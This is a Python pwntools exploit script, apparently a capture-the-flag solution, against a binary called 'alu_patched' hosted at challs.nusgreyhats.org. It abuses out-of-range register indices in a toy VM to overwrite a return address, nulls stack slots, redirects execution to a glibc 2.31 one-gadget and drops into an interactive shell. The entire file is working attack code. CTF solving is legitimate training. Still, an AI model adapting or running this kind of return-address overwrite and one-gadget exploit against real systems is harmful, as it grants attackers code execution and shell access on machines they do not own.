#!/usr/bin/python2

from pwn import *

exe = ELF("alu_patched")
libc = ELF("libc-2.31.so")
ld = ELF("ld-2.31.so")

context.binary = exe



def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote('challs.nusgreyhats.org', 13500)

    return r

r = conn()

def rgt():
    r.recvuntil('>')

def inp(reg, val):
    r.sendline('inp {}'.format(reg))
    rgt()
    r.sendline('{}'.format(val))
    rgt()

def arith(op, reg, val):
    r.sendline('{} {} {}'.format(op, reg, val))
    rgt()

def main():
    #define offsets
    run_vm_ret_addr_offset = 0x1626
    clear_r12tor15 = 0x16cc
    stdout_offset = libc.symbols['_IO_2_1_stdout_']
    onegadget_offset = 0xe3b2e

    r.recvuntil('>')
    arith('add', 'a', 4294967295)
    #replace return address for run_vm with the address of gadget
    arith('add','\x8b', clear_r12tor15 - run_vm_ret_addr_offset) 
    
    #clear addresses on the stack, so that null is popped into r12 and r15, this is required for the one gadget to work
    arith('mod','\x8d', 1)
    arith('mod','\x8e', 1)
    arith('mod','\x8f', 1)
    arith('mod','\x90', 1)
    arith('mod','\x91', 1)
    arith('mod','\x92', 1)
    arith('mod','\x93', 1)
    arith('mod','\x94', 1)

    #clear space for one gadget and then fill it in
    arith('mod','\x95', 1)
    arith('mod','\x96', 1)
    arith('add','\x95', '\x7b')
    arith('add','\x96', '\x7c')
    arith('add', '\x95', onegadget_offset-stdout_offset)

    #trigger rop chain
    r.sendline('')
    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
